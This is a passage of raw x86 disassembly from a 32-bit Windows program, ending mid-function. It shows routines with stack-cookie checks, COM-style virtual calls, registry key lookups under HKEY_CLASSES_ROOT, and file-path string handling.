  405494:	push   ebx
  405495:	push   esi
  405496:	push   edi
  405497:	mov    edi,DWORD PTR ds:0x407084
  40549d:	cmp    edi,ecx
  40549f:	jae    0x4054e7
  4054a1:	mov    ebx,DWORD PTR [edi]
  4054a3:	test   ebx,ebx
  4054a5:	je     0x4054dc
  4054a7:	mov    esi,DWORD PTR [ebx+0x1c]
  4054aa:	mov    ecx,esi
  4054ac:	push   0x0
  4054ae:	call   DWORD PTR ds:0x4081a0
  4054b4:	call   esi
  4054b6:	mov    ecx,DWORD PTR [ebx]
  4054b8:	mov    edx,eax
  4054ba:	call   0x40550b
  4054bf:	test   eax,eax
  4054c1:	js     0x4054f2
  4054c3:	mov    esi,DWORD PTR [ebx+0x4]
  4054c6:	mov    ecx,esi
  4054c8:	push   0x0
  4054ca:	call   DWORD PTR ds:0x4081a0
  4054d0:	call   esi
  4054d2:	test   eax,eax
  4054d4:	js     0x4054f2
  4054d6:	mov    ecx,DWORD PTR ds:0x407088
  4054dc:	add    edi,0x4
  4054df:	cmp    edi,ecx
  4054e1:	jb     0x4054a1
  4054e3:	test   eax,eax
  4054e5:	js     0x4054f2
  4054e7:	mov    ecx,DWORD PTR ds:0x407080
  4054ed:	call   0x4053c4
  4054f2:	mov    ecx,DWORD PTR [esp+0xc]
  4054f6:	pop    edi
  4054f7:	pop    esi
  4054f8:	pop    ebx
  4054f9:	xor    ecx,esp
  4054fb:	call   0x406340
  405500:	mov    esp,ebp
  405502:	pop    ebp
  405503:	ret    0x8
  405506:	int3   
  405507:	int3   
  405508:	int3   
  405509:	int3   
  40550a:	int3   
  40550b:	mov    edi,edi
  40550d:	push   ebp
  40550e:	mov    ebp,esp
  405510:	sub    esp,0x1c0
  405516:	mov    eax,ds:0x407008
  40551b:	xor    eax,ebp
  40551d:	mov    DWORD PTR [ebp-0x8],eax
  405520:	push   ebx
  405521:	push   esi
  405522:	xor    ebx,ebx
  405524:	mov    DWORD PTR [ebp-0x1a8],edx
  40552a:	mov    esi,ebx
  40552c:	mov    DWORD PTR [ebp-0x1a4],esi
  405532:	push   edi
  405533:	mov    edi,ecx
  405535:	mov    DWORD PTR [ebp-0x1a0],edi
  40553b:	test   edx,edx
  40553d:	je     0x40586a
  405543:	mov    edx,0x4018b8
  405548:	call   0x4030cc
  40554d:	test   eax,eax
  40554f:	jne    0x40586a
  405555:	lea    eax,[ebp-0x1a4]
  40555b:	push   eax
  40555c:	push   0x401804
  405561:	push   0x1
  405563:	push   ebx
  405564:	push   0x4018a8
  405569:	call   DWORD PTR ds:0x408180
  40556f:	test   eax,eax
  405571:	js     0x405864
  405577:	mov    eax,DWORD PTR [ebp-0x1a8]
  40557d:	jmp    0x405619
  405582:	lea    edi,[ebp-0x19c]
  405588:	mov    esi,DWORD PTR [eax+0x4]
  40558b:	lea    ecx,[ebp-0x19c]
  405591:	push   ecx
  405592:	push   0x1
  405594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405598:	cmp    DWORD PTR [ebp+0x8],ebx
  40559b:	je     0x4055db
  40559d:	cmp    DWORD PTR [eax],0x1
  4055a0:	mov    eax,DWORD PTR [ebp-0x1a4]
  4055a6:	push   DWORD PTR [ebp-0x1a0]
  4055ac:	push   eax
  4055ad:	mov    esi,DWORD PTR [eax]
  4055af:	jne    0x4055bf
  4055b1:	mov    ecx,DWORD PTR [esi+0x14]
  4055b4:	call   DWORD PTR ds:0x4081a0
  4055ba:	call   DWORD PTR [esi+0x14]
  4055bd:	jmp    0x4055cb
  4055bf:	mov    ecx,DWORD PTR [esi+0x1c]
  4055c2:	call   DWORD PTR ds:0x4081a0
  4055c8:	call   DWORD PTR [esi+0x1c]
  4055cb:	test   eax,eax
  4055cd:	js     0x40585c
  4055d3:	mov    edi,DWORD PTR [ebp-0x1a0]
  4055d9:	jmp    0x40560a
  4055db:	cmp    DWORD PTR [eax],0x1
  4055de:	mov    eax,DWORD PTR [ebp-0x1a4]
  4055e4:	mov    edi,DWORD PTR [ebp-0x1a0]
  4055ea:	push   edi
  4055eb:	push   eax
  4055ec:	mov    esi,DWORD PTR [eax]
  4055ee:	jne    0x4055fe
  4055f0:	mov    ecx,DWORD PTR [esi+0x18]
  4055f3:	call   DWORD PTR ds:0x4081a0
  4055f9:	call   DWORD PTR [esi+0x18]
  4055fc:	jmp    0x40560a
  4055fe:	mov    ecx,DWORD PTR [esi+0x20]
  405601:	call   DWORD PTR ds:0x4081a0
  405607:	call   DWORD PTR [esi+0x20]
  40560a:	mov    eax,DWORD PTR [ebp-0x1a8]
  405610:	add    eax,0x8
  405613:	mov    DWORD PTR [ebp-0x1a8],eax
  405619:	cmp    DWORD PTR [eax],ebx
  40561b:	jne    0x405582
  405621:	cmp    DWORD PTR [ebp+0x8],ebx
  405624:	jne    0x405854
  40562a:	push   0x40
  40562c:	lea    eax,[ebp-0x18c]
  405632:	push   eax
  405633:	push   edi
  405634:	call   DWORD PTR ds:0x408184
  40563a:	push   0x401840
  40563f:	mov    esi,0x80
  405644:	mov    DWORD PTR [ebp-0x1c0],ebx
  40564a:	lea    eax,[ebp-0x10c]
  405650:	push   esi
  405651:	push   eax
  405652:	call   DWORD PTR ds:0x408130
  405658:	add    esp,0xc
  40565b:	mov    ecx,eax
  40565d:	call   0x403dc5
  405662:	lea    eax,[ebp-0x18c]
  405668:	push   eax
  405669:	lea    eax,[ebp-0x10c]
  40566f:	push   esi
  405670:	push   eax
  405671:	call   DWORD PTR ds:0x40812c
  405677:	add    esp,0xc
  40567a:	mov    ecx,eax
  40567c:	call   0x403dc5
  405681:	push   0x401814
  405686:	lea    eax,[ebp-0x10c]
  40568c:	push   esi
  40568d:	push   eax
  40568e:	call   DWORD PTR ds:0x40812c
  405694:	add    esp,0xc
  405697:	mov    ecx,eax
  405699:	call   0x403dc5
  40569e:	lea    eax,[ebp-0x1a8]
  4056a4:	mov    DWORD PTR [ebp-0x1b4],ebx
  4056aa:	push   eax
  4056ab:	push   0x20019
  4056b0:	push   ebx
  4056b1:	lea    eax,[ebp-0x10c]
  4056b7:	mov    DWORD PTR [ebp-0x1b0],ebx
  4056bd:	mov    edi,0x80000000
  4056c2:	mov    DWORD PTR [ebp-0x1a0],ebx
  4056c8:	push   eax
  4056c9:	push   edi
  4056ca:	mov    DWORD PTR [ebp-0x1b8],edi
  4056d0:	mov    esi,ebx
  4056d2:	mov    DWORD PTR [ebp-0x1a8],ebx
  4056d8:	call   DWORD PTR ds:0x40800c
  4056de:	test   eax,eax
  4056e0:	jne    0x40573d
  4056e2:	mov    esi,DWORD PTR [ebp-0x1a8]
  4056e8:	lea    eax,[ebp-0x1a0]
  4056ee:	push   ebx
  4056ef:	push   ebx
  4056f0:	push   ebx
  4056f1:	push   ebx
  4056f2:	push   ebx
  4056f3:	push   ebx
  4056f4:	push   ebx
  4056f5:	push   eax
  4056f6:	push   ebx
  4056f7:	push   ebx
  4056f8:	push   ebx
  4056f9:	push   esi
  4056fa:	call   DWORD PTR ds:0x408004
  405700:	mov    DWORD PTR [ebp-0x1ac],eax
  405706:	test   esi,esi
  405708:	je     0x405719
  40570a:	push   esi
  40570b:	call   DWORD PTR ds:0x408000
  405711:	mov    eax,DWORD PTR [ebp-0x1ac]
  405717:	mov    esi,ebx
  405719:	test   eax,eax
  40571b:	jne    0x40573d
  40571d:	cmp    DWORD PTR [ebp-0x1a0],ebx
  405723:	jne    0x40573d
  405725:	lea    eax,[ebp-0x10c]
  40572b:	push   eax
  40572c:	lea    ecx,[ebp-0x1b8]
  405732:	call   0x40401b
  405737:	mov    edi,DWORD PTR [ebp-0x1b8]
  40573d:	push   0x401840
  405742:	lea    eax,[ebp-0x10c]
  405748:	push   0x80
  40574d:	push   eax
  40574e:	call   DWORD PTR ds:0x408130
  405754:	add    esp,0xc
  405757:	mov    ecx,eax
  405759:	call   0x403dc5
  40575e:	lea    eax,[ebp-0x18c]
  405764:	push   eax
  405765:	lea    eax,[ebp-0x10c]
  40576b:	push   0x80
  405770:	push   eax
  405771:	call   DWORD PTR ds:0x40812c
  405777:	add    esp,0xc
  40577a:	mov    ecx,eax
  40577c:	call   0x403dc5
  405781:	push   0x401850
  405786:	lea    eax,[ebp-0x10c]
  40578c:	push   0x80
  405791:	push   eax
  405792:	call   DWORD PTR ds:0x40812c
  405798:	add    esp,0xc
  40579b:	mov    ecx,eax
  40579d:	call   0x403dc5
  4057a2:	lea    eax,[ebp-0x1ac]
  4057a8:	mov    DWORD PTR [ebp-0x1ac],ebx
  4057ae:	push   eax
  4057af:	push   0x20019
  4057b4:	push   ebx
  4057b5:	lea    eax,[ebp-0x10c]
  4057bb:	push   eax
  4057bc:	push   edi
  4057bd:	call   DWORD PTR ds:0x40800c
  4057c3:	test   eax,eax
  4057c5:	jne    0x405833
  4057c7:	mov    eax,ebx
  4057c9:	test   esi,esi
  4057cb:	je     0x4057d4
  4057cd:	push   esi
  4057ce:	call   DWORD PTR ds:0x408000
  4057d4:	mov    esi,DWORD PTR [ebp-0x1ac]
  4057da:	test   eax,eax
  4057dc:	jne    0x405833
  4057de:	push   ebx
  4057df:	push   ebx
  4057e0:	push   ebx
  4057e1:	push   ebx
  4057e2:	push   ebx
  4057e3:	push   ebx
  4057e4:	push   ebx
  4057e5:	lea    eax,[ebp-0x1a0]
  4057eb:	push   eax
  4057ec:	push   ebx
  4057ed:	push   ebx
  4057ee:	push   ebx
  4057ef:	push   esi
  4057f0:	call   DWORD PTR ds:0x408004
  4057f6:	mov    DWORD PTR [ebp-0x1bc],eax
  4057fc:	test   esi,esi
  4057fe:	je     0x40580f
  405800:	push   esi
  405801:	call   DWORD PTR ds:0x408000
  405807:	mov    eax,DWORD PTR [ebp-0x1bc]
  40580d:	mov    esi,ebx
  40580f:	test   eax,eax
  405811:	jne    0x405833
  405813:	cmp    DWORD PTR [ebp-0x1a0],ebx
  405819:	jne    0x405833
  40581b:	lea    eax,[ebp-0x10c]
  405821:	push   eax
  405822:	lea    ecx,[ebp-0x1b8]
  405828:	call   0x40401b
  40582d:	mov    edi,DWORD PTR [ebp-0x1b8]
  405833:	test   esi,esi
  405835:	je     0x40583e
  405837:	push   esi
  405838:	call   DWORD PTR ds:0x408000
  40583e:	test   edi,edi
  405840:	je     0x405849
  405842:	push   edi
  405843:	call   DWORD PTR ds:0x408000
  405849:	lea    ecx,[ebp-0x1c0]
  40584f:	call   0x403968
  405854:	mov    esi,DWORD PTR [ebp-0x1a4]
  40585a:	jmp    0x40586e
  40585c:	mov    esi,DWORD PTR [ebp-0x1a4]
  405862:	jmp    0x40586c
  405864:	mov    esi,DWORD PTR [ebp-0x1a4]
  40586a:	mov    eax,ebx
  40586c:	mov    ebx,eax
  40586e:	test   esi,esi
  405870:	je     0x405882
  405872:	mov    ecx,DWORD PTR [esi]
  405874:	push   esi
  405875:	mov    esi,DWORD PTR [ecx+0x8]
  405878:	mov    ecx,esi
  40587a:	call   DWORD PTR ds:0x4081a0
  405880:	call   esi
  405882:	mov    ecx,DWORD PTR [ebp-0x8]
  405885:	mov    eax,ebx
  405887:	pop    edi
  405888:	pop    esi
  405889:	xor    ecx,ebp
  40588b:	pop    ebx
  40588c:	call   0x406340
  405891:	mov    esp,ebp
  405893:	pop    ebp
  405894:	ret    0x4
  405897:	int3   
  405898:	int3   
  405899:	int3   
  40589a:	int3   
  40589b:	int3   
  40589c:	mov    edi,edi
  40589e:	push   ebp
  40589f:	mov    ebp,esp
  4058a1:	sub    esp,0x238
  4058a7:	mov    eax,ds:0x407008
  4058ac:	xor    eax,ebp
  4058ae:	mov    DWORD PTR [ebp-0x4],eax
  4058b1:	mov    eax,DWORD PTR [ebp+0x8]
  4058b4:	mov    DWORD PTR [ebp-0x234],eax
  4058ba:	push   esi
  4058bb:	mov    esi,DWORD PTR [ebp+0xc]
  4058be:	mov    DWORD PTR [ebp-0x238],esi
  4058c4:	test   eax,eax
  4058c6:	je     0x4059f5
  4058cc:	test   esi,esi
  4058ce:	je     0x4059f5
  4058d4:	push   ebx
  4058d5:	push   edi
  4058d6:	xor    edi,edi
  4058d8:	mov    ebx,0x104
  4058dd:	mov    DWORD PTR [eax],edi
  4058df:	lea    eax,[ebp-0x22c]
  4058e5:	push   ebx
  4058e6:	push   eax
  4058e7:	push   ecx
  4058e8:	mov    DWORD PTR [esi],edi
  4058ea:	mov    DWORD PTR [ebp-0x230],edi
  4058f0:	call   DWORD PTR ds:0x40804c
  4058f6:	test   eax,eax
  4058f8:	jne    0x405906
  4058fa:	call   0x40354f
  4058ff:	mov    esi,eax
  405901:	jmp    0x4059e4
  405906:	cmp    eax,ebx
  405908:	jne    0x405914
  40590a:	mov    esi,0x8007007a
  40590f:	jmp    0x4059e4
  405914:	mov    cx,WORD PTR [ebp-0x22c]
  40591b:	lea    eax,[ebp-0x22c]
  405921:	mov    ebx,edi
  405923:	test   cx,cx
  405926:	je     0x405951
  405928:	movzx  ecx,cx
  40592b:	movzx  ecx,cx
  40592e:	cmp    ecx,0x2e
  405931:	je     0x40593c
  405933:	cmp    ecx,0x5c
  405936:	jne    0x40593e
  405938:	mov    ebx,edi
  40593a:	jmp    0x40593e
  40593c:	mov    ebx,eax
  40593e:	push   eax
  40593f:	call   DWORD PTR ds:0x4080d8
  405945:	movzx  ecx,WORD PTR [eax]
  405948:	test   cx,cx
  40594b:	jne    0x40592b
  40594d:	test   ebx,ebx
  40594f:	jne    0x405953
  405951:	mov    ebx,eax
  405953:	push   esi
  405954:	lea    eax,[ebp-0x22c]
  40595a:	push   eax
  40595b:	call   DWORD PTR ds:0x4080c4
  405961:	mov    esi,eax
  405963:	test   esi,esi
  405965:	jns    0x4059c6
  405967:	mov    esi,0x401880
  40596c:	lea    eax,[ebp-0x22c]
  405972:	lea    edi,[ebp-0x10]
  405975:	mov    ecx,ebx
  405977:	sub    ecx,eax
  405979:	sar    ecx,1
  40597b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40597c:	lea    eax,[ecx+0x5]
  40597f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405980:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  405982:	cmp    eax,0x104
  405987:	jbe    0x405990
  405989:	mov    esi,0x80004005
  40598e:	jmp    0x4059e4
  405990:	lea    eax,[ebp-0x10]
  405993:	push   eax
  405994:	mov    eax,0x10e
  405999:	sub    eax,ecx
  40599b:	push   eax
  40599c:	push   ebx
  40599d:	call   DWORD PTR ds:0x408130
  4059a3:	add    esp,0xc
  4059a6:	mov    ecx,eax
  4059a8:	call   0x403dc5
  4059ad:	push   DWORD PTR [ebp-0x238]
  4059b3:	lea    eax,[ebp-0x22c]
  4059b9:	push   eax
  4059ba:	call   DWORD PTR ds:0x4080c4
  4059c0:	mov    esi,eax
  4059c2:	test   esi,esi
  4059c4:	js     0x4059e4
  4059c6:	lea    eax,[ebp-0x22c]
  4059cc:	push   eax
  4059cd:	call   DWORD PTR ds:0x4080bc
  4059d3:	mov    ecx,DWORD PTR [ebp-0x234]
  4059d9:	mov    DWORD PTR [ecx],eax
  4059db:	test   eax,eax
  4059dd:	jne    0x4059e4
  4059df:	mov    esi,0x8007000e
  4059e4:	lea    ecx,[ebp-0x230]
  4059ea:	call   0x403968
  4059ef:	pop    edi
  4059f0:	mov    eax,esi
  4059f2:	pop    ebx
  4059f3:	jmp    0x4059fa
  4059f5:	mov    eax,0x80004003
  4059fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4059fd:	xor    ecx,ebp
  4059ff:	pop    esi
  405a00:	call   0x406340
  405a05:	mov    esp,ebp
  405a07:	pop    ebp
  405a08:	ret    0x8
  405a0b:	int3   
  405a0c:	int3   
  405a0d:	int3   
  405a0e:	int3   
  405a0f:	int3   
  405a10:	mov    edi,edi
  405a12:	push   ebp
  405a13:	mov    ebp,esp
  405a15:	sub    esp,0x218
  405a1b:	mov    eax,ds:0x407008
  405a20:	xor    eax,ebp
  405a22:	mov    DWORD PTR [ebp-0x4],eax
  405a25:	push   ebx
  405a26:	xor    eax,eax
  405a28:	push   esi
  405a29:	mov    DWORD PTR [ebp-0x214],eax
  405a2f:	mov    DWORD PTR [ebp-0x210],eax
  405a35:	lea    eax,[ebp-0x210]
  405a3b:	push   edi
  405a3c:	push   eax
  405a3d:	lea    eax,[ebp-0x214]
  405a43:	push   eax
  405a44:	call   0x40589c
  405a49:	mov    esi,DWORD PTR [ebp-0x214]
  405a4f:	mov    ebx,eax
  405a51:	test   ebx,ebx
  405a53:	js     0x405b47
  405a59:	mov    eax,DWORD PTR [ebp-0x210]
  405a5f:	lea    ecx,[ebp-0x218]
  405a65:	push   ecx
  405a66:	xor    ebx,ebx
  405a68:	push   ebx
  405a69:	push   ebx
  405a6a:	mov    DWORD PTR [ebp-0x218],ebx
  405a70:	mov    edi,DWORD PTR [eax]
  405a72:	push   ebx
  405a73:	push   0xffffffff
  405a75:	push   eax
  405a76:	mov    ecx,DWORD PTR [edi+0x24]
  405a79:	call   DWORD PTR ds:0x4081a0
  405a7f:	call   DWORD PTR [edi+0x24]
  405a82:	test   eax,eax
  405a84:	js     0x405b2b
  405a8a:	cmp    DWORD PTR [ebp-0x218],ebx
  405a90:	je     0x405b2b
  405a96:	push   esi
  405a97:	call   DWORD PTR ds:0x4080b4
  405a9d:	push   eax
  405a9e:	push   esi
  405a9f:	lea    eax,[ebp-0x20c]
  405aa5:	push   0x104
  405aaa:	push   eax
  405aab:	call   DWORD PTR ds:0x408154
  405ab1:	add    esp,0x10
  405ab4:	mov    ecx,eax
  405ab6:	call   0x403dc5
  405abb:	xor    eax,eax
  405abd:	lea    edi,[ebp-0x20c]
  405ac3:	mov    ebx,edi
  405ac5:	mov    WORD PTR [ebp-0x6],ax
  405ac9:	cmp    WORD PTR [ebp-0x20c],ax
  405ad0:	je     0x405afc
  405ad2:	xor    esi,esi
  405ad4:	push   ebx
  405ad5:	call   DWORD PTR ds:0x4080d8
  405adb:	movzx  ecx,WORD PTR [ebx]
  405ade:	cmp    ecx,0x5c
  405ae1:	je     0x405aed
  405ae3:	cmp    ecx,0x2f
  405ae6:	je     0x405aed
  405ae8:	cmp    ecx,0x3a
  405aeb:	jne    0x405aef
  405aed:	mov    edi,eax
  405aef:	mov    ebx,eax
  405af1:	cmp    WORD PTR [eax],si
  405af4:	jne    0x405ad4
  405af6:	mov    esi,DWORD PTR [ebp-0x214]
  405afc:	lea    eax,[ebp-0x20c]
  405b02:	sub    edi,eax
  405b04:	sar    edi,1
  405b06:	cmp    edi,0x104
  405b0c:	jae    0x405b22
  405b0e:	add    edi,edi
  405b10:	cmp    edi,0x208
  405b16:	jae    0x405b7b
  405b18:	xor    eax,eax
  405b1a:	mov    WORD PTR [ebp+edi*1-0x20c],ax
  405b22:	lea    eax,[ebp-0x20c]
  405b28:	push   eax
  405b29:	jmp    0x405b2c
  405b2b:	push   ebx
  405b2c:	push   esi
  405b2d:	push   DWORD PTR [ebp-0x210]
  405b33:	call   DWORD PTR ds:0x4080c0
  405b39:	push   DWORD PTR [ebp-0x218]
  405b3f:	mov    ebx,eax
  405b41:	call   DWORD PTR ds:0x4080cc
  405b47:	mov    eax,DWORD PTR [ebp-0x210]
  405b4d:	test   eax,eax
  405b4f:	je     0x405b61
  405b51:	mov    ecx,DWORD PTR [eax]
  405b53:	push   eax
  405b54:	mov    edi,DWORD PTR [ecx+0x8]
  405b57:	mov    ecx,edi
  405b59:	call   DWORD PTR ds:0x4081a0
  405b5f:	call   edi
  405b61:	push   esi
  405b62:	call   DWORD PTR ds:0x4080cc
  405b68:	mov    ecx,DWORD PTR [ebp-0x4]
  405b6b:	mov    eax,ebx
  405b6d:	pop    edi
  405b6e:	pop    esi
  405b6f:	xor    ecx,ebp
  405b71:	pop    ebx
  405b72:	call   0x406340
  405b77:	mov    esp,ebp
  405b79:	pop    ebp
  405b7a:	ret    
  405b7b:	call   0x406500
  405b80:	int3   
  405b81:	int3   
  405b82:	int3   
  405b83:	int3   
  405b84:	int3   
  405b85:	int3   
  405b86:	mov    edi,edi
  405b88:	push   ebx
  405b89:	mov    ebx,ecx
  405b8b:	push   esi
  405b8c:	push   edi
  405b8d:	mov    edi,edx
  405b8f:	movzx  eax,WORD PTR [ebx]
  405b92:	push   eax
  405b93:	call   DWORD PTR ds:0x4080dc
  405b99:	movzx  esi,ax
  405b9c:	movzx  eax,WORD PTR [edi]
  405b9f:	push   eax
  405ba0:	call   DWORD PTR ds:0x4080dc
  405ba6:	movzx  eax,ax
  405ba9:	push   0x20
  405bab:	pop    edx
  405bac:	push   0x9
  405bae:	pop    ecx
  405baf:	test   si,si
  405bb2:	je     0x405c09
  405bb4:	cmp    si,ax
  405bb7:	jne    0x405bfa
  405bb9:	cmp    si,dx
  405bbc:	je     0x405bfa
  405bbe:	cmp    si,cx
  405bc1:	je     0x405bfa
  405bc3:	push   ebx
  405bc4:	call   DWORD PTR ds:0x4080d8
  405bca:	push   edi
  405bcb:	mov    ebx,eax
  405bcd:	call   DWORD PTR ds:0x4080d8
  405bd3:	mov    edi,eax
  405bd5:	movzx  eax,WORD PTR [ebx]
  405bd8:	push   eax
  405bd9:	call   DWORD PTR ds:0x4080dc
  405bdf:	movzx  esi,ax
  405be2:	movzx  eax,WORD PTR [edi]
  405be5:	push   eax
  405be6:	call   DWORD PTR ds:0x4080dc
  405bec:	movzx  eax,ax
  405bef:	push   0x9
  405bf1:	pop    ecx
  405bf2:	push   0x20
  405bf4:	pop    edx
  405bf5:	test   si,si
  405bf8:	jne    0x405bb4
  405bfa:	test   si,si
  405bfd:	je     0x405c09
  405bff:	cmp    si,dx
  405c02:	je     0x405c09
  405c04:	cmp    si,cx
  405c07:	jne    0x405c18
  405c09:	test   ax,ax
  405c0c:	je     0x405c23
  405c0e:	cmp    ax,dx
  405c11:	je     0x405c23
  405c13:	cmp    ax,cx
  405c16:	je     0x405c23
  405c18:	cmp    si,ax
  405c1b:	sbb    eax,eax
  405c1d:	and    eax,0xfffffffe
  405c20:	inc    eax
  405c21:	jmp    0x405c25
  405c23:	xor    eax,eax
  405c25:	pop    edi
  405c26:	pop    esi
  405c27:	pop    ebx
  405c28:	ret    
  405c29:	int3   
  405c2a:	int3   
  405c2b:	int3   
  405c2c:	int3   
  405c2d:	int3   
  405c2e:	mov    edi,edi
  405c30:	push   esi
  405c31:	push   edi
  405c32:	mov    edi,edx
  405c34:	mov    esi,ecx
  405c36:	jmp    0x405c65
  405c38:	cmp    WORD PTR [esi],0x0
  405c3c:	je     0x405c69
  405c3e:	mov    eax,edi
  405c40:	test   edi,edi
  405c42:	je     0x405c5c
  405c44:	movzx  ecx,WORD PTR [eax]
  405c47:	test   cx,cx
  405c4a:	je     0x405c5c
  405c4c:	cmp    WORD PTR [esi],cx
  405c4f:	je     0x405c6e
  405c51:	push   eax
  405c52:	call   DWORD PTR ds:0x4080d8
  405c58:	test   eax,eax
  405c5a:	jne    0x405c44
  405c5c:	push   esi
  405c5d:	call   DWORD PTR ds:0x4080d8
  405c63:	mov    esi,eax
  405c65:	test   esi,esi
  405c67:	jne    0x405c38
  405c69:	xor    eax,eax
  405c6b:	pop    edi
  405c6c:	pop    esi
  405c6d:	ret    
  405c6e:	push   esi
  405c6f:	call   DWORD PTR ds:0x4080d8
  405c75:	jmp    0x405c6b
  405c77:	int3   
  405c78:	int3   
  405c79:	int3   
  405c7a:	int3   
  405c7b:	int3   
  405c7c:	mov    edi,edi
  405c7e:	push   ebp
  405c7f:	mov    ebp,esp
  405c81:	push   ecx
  405c82:	mov    eax,ds:0x407008
  405c87:	xor    eax,ebp
  405c89:	mov    DWORD PTR [ebp-0x4],eax
  405c8c:	cmp    DWORD PTR ds:0x40707c,0x0
  405c93:	je     0x405ce9
  405c95:	mov    eax,ds:0x407088
  405c9a:	push   edi
  405c9b:	mov    edi,DWORD PTR ds:0x407084
  405ca1:	cmp    edi,eax
  405ca3:	jae    0x405cd6
  405ca5:	push   ebx
  405ca6:	push   esi
  405ca7:	mov    ebx,DWORD PTR [edi]
  405ca9:	test   ebx,ebx
  405cab:	je     0x405ccd
  405cad:	mov    ecx,DWORD PTR [ebx+0x10]
  405cb0:	test   ecx,ecx
  405cb2:	je     0x405cc4
  405cb4:	mov    eax,DWORD PTR [ecx]
  405cb6:	push   ecx
  405cb7:	mov    esi,DWORD PTR [eax+0x8]
  405cba:	mov    ecx,esi
  405cbc:	call   DWORD PTR ds:0x4081a0
  405cc2:	call   esi
  405cc4:	and    DWORD PTR [ebx+0x10],0x0
  405cc8:	mov    eax,ds:0x407088
  405ccd:	add    edi,0x4
  405cd0:	cmp    edi,eax
  405cd2:	jb     0x405ca7
  405cd4:	pop    esi
  405cd5:	pop    ebx
  405cd6:	push   0x40708c
  405cdb:	call   DWORD PTR ds:0x408064
  405ce1:	and    DWORD PTR ds:0x40707c,0x0
  405ce8:	pop    edi
  405ce9:	mov    ecx,DWORD PTR [ebp-0x4]
  405cec:	xor    ecx,ebp
  405cee:	call   0x406340
  405cf3:	mov    esp,ebp
  405cf5:	pop    ebp
  405cf6:	ret    
  405cf7:	int3   
  405cf8:	int3   
  405cf9:	int3   
  405cfa:	int3   
  405cfb:	int3   
  405cfc:	mov    edi,edi
  405cfe:	push   ebp
  405cff:	mov    ebp,esp
  405d01:	push   ecx
  405d02:	mov    eax,ds:0x407008
  405d07:	xor    eax,ebp
  405d09:	mov    DWORD PTR [ebp-0x4],eax
  405d0c:	push   ebx
  405d0d:	mov    ebx,ecx
  405d0f:	push   edi
  405d10:	test   ebx,ebx
  405d12:	je     0x405d50
  405d14:	mov    edi,DWORD PTR [ebx+0x8]
  405d17:	test   edi,edi
  405d19:	je     0x405d3c
  405d1b:	push   esi
  405d1c:	mov    esi,DWORD PTR [edi]
  405d1e:	mov    ecx,esi
  405d20:	push   DWORD PTR [edi+0x4]
  405d23:	call   DWORD PTR ds:0x4081a0
  405d29:	call   esi
  405d2b:	mov    esi,DWORD PTR [edi+0x8]
  405d2e:	push   edi
  405d2f:	call   0x405f80
  405d34:	mov    edi,esi
  405d36:	pop    ecx
  405d37:	test   esi,esi
  405d39:	jne    0x405d1c
  405d3b:	pop    esi
  405d3c:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3f:	and    DWORD PTR [ebx+0x8],0x0
  405d43:	xor    ecx,ebp
  405d45:	pop    edi
  405d46:	pop    ebx
  405d47:	call   0x406340
  405d4c:	mov    esp,ebp
  405d4e:	pop    ebp
  405d4f:	ret    
  405d50:	mov    ecx,0xc0000005
  405d55:	call   0x403d91
  405d5a:	int3   
  405d5b:	int3   
  405d5c:	int3   
  405d5d:	int3   
  405d5e:	int3   
  405d5f:	int3   
  405d60:	mov    edi,edi
  405d62:	push   ebp
  405d63:	mov    ebp,esp
  405d65:	push   ecx
  405d66:	mov    eax,ds:0x407008
  405d6b:	xor    eax,ebp
  405d6d:	mov    DWORD PTR [ebp-0x4],eax
  405d70:	push   ebx
  405d71:	push   edi
  405d72:	mov    edi,ecx
  405d74:	lea    ebx,[edi+0x4]
  405d77:	cmp    DWORD PTR [ebx],0x0
  405d7a:	je     0x405db3
  405d7c:	cmp    DWORD PTR [edi+0xc],0x0
  405d80:	je     0x405d8d
  405d82:	mov    ecx,ebx
  405d84:	call   0x405cfc
  405d89:	and    DWORD PTR [edi+0xc],0x0
  405d8d:	mov    ecx,DWORD PTR [edi+0x28]
  405d90:	test   ecx,ecx
  405d92:	je     0x405da6
  405d94:	mov    eax,DWORD PTR [ecx]
  405d96:	push   esi
  405d97:	push   ecx
  405d98:	mov    esi,DWORD PTR [eax+0x8]
  405d9b:	mov    ecx,esi
  405d9d:	call   DWORD PTR ds:0x4081a0
  405da3:	call   esi
  405da5:	pop    esi
  405da6:	lea    eax,[edi+0x10]
  405da9:	push   eax
  405daa:	call   DWORD PTR ds:0x408064
  405db0:	and    DWORD PTR [ebx],0x0
  405db3:	mov    ecx,DWORD PTR [ebp-0x4]
  405db6:	pop    edi
  405db7:	xor    ecx,ebp
  405db9:	pop    ebx
  405dba:	call   0x406340
  405dbf:	mov    esp,ebp
  405dc1:	pop    ebp
  405dc2:	ret    
  405dc3:	int3   
  405dc4:	int3   
  405dc5:	int3   
  405dc6:	int3   
  405dc7:	int3   
  405dc8:	mov    edi,edi
  405dca:	push   ebp
  405dcb:	mov    ebp,esp
  405dcd:	push   ecx
  405dce:	mov    eax,ds:0x407008
  405dd3:	xor    eax,ebp
  405dd5:	mov    DWORD PTR [ebp-0x4],eax
  405dd8:	mov    eax,ds:0x407088
  405ddd:	push   edi
  405dde:	mov    edi,DWORD PTR ds:0x407084
  405de4:	cmp    edi,eax
  405de6:	jae    0x405e0c
  405de8:	push   esi
  405de9:	mov    esi,DWORD PTR [edi]
  405deb:	test   esi,esi
  405ded:	je     0x405e04
  405def:	mov    esi,DWORD PTR [esi+0x20]
  405df2:	mov    ecx,esi
  405df4:	push   DWORD PTR [ebp+0x8]
  405df7:	call   DWORD PTR ds:0x4081a0
  405dfd:	call   esi
  405dff:	mov    eax,ds:0x407088
  405e04:	add    edi,0x4
  405e07:	cmp    edi,eax
  405e09:	jb     0x405de9
  405e0b:	pop    esi
  405e0c:	mov    ecx,DWORD PTR [ebp-0x4]
  405e0f:	xor    ecx,ebp
  405e11:	pop    edi
  405e12:	call   0x406340
  405e17:	mov    esp,ebp
  405e19:	pop    ebp
  405e1a:	ret    0x4
  405e1d:	int3   
  405e1e:	int3   
  405e1f:	int3   
  405e20:	int3   
  405e21:	int3   
  405e22:	mov    edi,edi
  405e24:	push   edi
